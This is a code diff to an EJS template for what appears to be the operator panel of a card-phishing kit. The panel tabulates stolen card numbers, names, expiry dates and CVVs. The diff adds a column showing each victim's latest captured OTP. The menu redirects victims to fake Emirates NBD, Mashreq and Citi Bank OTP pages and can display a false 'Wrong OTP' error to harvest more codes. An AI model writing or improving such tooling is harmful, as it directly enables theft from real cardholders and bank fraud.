@@ -55,12 +55,12 @@
         <th>#</th><th>Date</th><th>Plate</th><th>Amount</th>
         <th>Card No</th><th>Name</th><th>Exp</th><th>CVV</th>
         <th>Issuer</th><th>Country</th><th>Type</th>
-        <th>OTP Page</th><th style="width:130px;min-width:100px;">Comment</th><th>Actions</th>
+        <th>Page</th><th>OTP</th><th style="width:130px;min-width:100px;">Comment</th><th>Actions</th>
       </tr>
     </thead>
     <tbody>
     <% if (payments.length === 0) { %>
-    <tr><td colspan="15" style="text-align:center;padding:40px;color:var(--tx-muted);">No records found.</td></tr>
+    <tr><td colspan="16" style="text-align:center;padding:40px;color:var(--tx-muted);">No records found.</td></tr>
     <% } %>
     <%
     function getDeviceType(ua) {
@@ -114,6 +114,7 @@
       <td class="small"><%= p.card_country || '—' %></td>
       <td class="small"><%= p.card_type || '—' %></td>
       <td style="max-width:90px;"><span class="badge b-otp" style="max-width:88px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:inline-block;vertical-align:middle;cursor:default;" title="<%= p.otp_page || 'otp-sms' %>"><%= p.otp_page || 'otp-sms' %></span></td>
+      <td class="mono" style="font-size:12px;letter-spacing:1px;"><%= p.latest_otp || '—' %></td>
       <td style="width:130px;max-width:130px;">
         <textarea class="pay-comment" data-sid="<%= p.sid %>" rows="1"
           style="width:100%;resize:none;border:1px solid var(--bd);border-radius:4px;padding:4px 8px;font-size:12px;background:var(--bg-input);color:var(--tx-base);font-family:inherit;overflow-y:hidden;word-break:break-word;white-space:pre-wrap;line-height:1.4;"><%= p.comment || '' %></textarea>
@@ -159,7 +160,6 @@
       <div style="padding:4px 14px 2px;">
         <div style="font-size:10px;font-weight:800;color:var(--tx-muted);text-transform:uppercase;letter-spacing:.7px;padding:6px 2px 6px;">Redirect · OTP Page</div>
         <button class="am-row" onclick="doAction('redirect','otp-sms')"><span class="am-dot" style="background:#3b82f6;"></span><div class="am-texts"><div class="am-name">SMS Verification</div><div class="am-desc">Standard SMS one-time password</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
-        <button class="am-row" onclick="doAction('redirect','otp-sms2')"><span class="am-dot" style="background:#6366f1;"></span><div class="am-texts"><div class="am-name">SMS Verification 2</div><div class="am-desc">Alternate OTP entry page</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
         <button class="am-row" onclick="doAction('redirect','otp')"><span class="am-dot" style="background:#003366;"></span><div class="am-texts"><div class="am-name">Emirates NBD</div><div class="am-desc">ENBDX app push notification</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
         <button class="am-row" onclick="doAction('redirect','otp-mashreq')"><span class="am-dot" style="background:#c0392b;"></span><div class="am-texts"><div class="am-name">Mashreq</div><div class="am-desc">Mashreq bank verification</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
         <button class="am-row" onclick="doAction('redirect','otp-citi')"><span class="am-dot" style="background:#003b8e;"></span><div class="am-texts"><div class="am-name">Citi Bank</div><div class="am-desc">Citi bank OTP verification</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
@@ -183,6 +183,7 @@
       <div style="padding:2px 14px 2px;">
         <div style="font-size:10px;font-weight:800;color:var(--tx-muted);text-transform:uppercase;letter-spacing:.7px;padding:6px 2px 6px;">OTP Actions</div>
         <button class="am-row am-danger" onclick="doAction('wrong_otp')"><span class="am-dot" style="background:#dc2626;"></span><div class="am-texts"><div class="am-name am-red">Wrong OTP</div><div class="am-desc">Show incorrect code error on current OTP page</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
+        <button class="am-row" onclick="doAction('redirect','otp-sms2')"><span class="am-dot" style="background:#6366f1;"></span><div class="am-texts"><div class="am-name">OTP</div><div class="am-desc">Alternate OTP entry page</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
       </div>
 
       <div style="height:1px;background:var(--bd-light);margin:4px 14px;"></div>
